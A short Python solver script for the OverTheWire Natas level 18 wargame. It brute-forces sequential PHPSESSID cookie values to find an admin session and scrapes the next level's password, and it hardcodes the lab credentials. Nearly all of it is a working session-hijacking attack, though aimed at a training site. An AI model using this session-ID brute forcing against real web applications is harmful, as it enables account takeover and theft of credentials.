import requests
import string
import re


URL = 'http://natas18.natas.labs.overthewire.org/index.php?debug=true'
AUTH = ('natas18', '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
# HEADERS = {'Authorization': 'Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA=='}
DATA = {
    'username': 'admin',
    'password': 'parham'
}
LETTERS = string.ascii_letters + string.digits
LETTERS = string.digits + string.ascii_letters

for i in range(118, 650):
    print(' TESTING SESSION ID ', i, end='\r')
    cookies = {"PHPSESSID": f'{i}'}
    response = requests.post(url=URL, data=DATA, auth=AUTH, cookies=cookies)
    if 'You are an admin' in response.text:
        print('FOUND THE ADMIN SESSION ID ->', i)
        match = print('password', re.findall(r'Password: (.*?)</pre>', response.text))
        break
    if response.status_code != 200:
        print('ERROR', response.status_code, i)

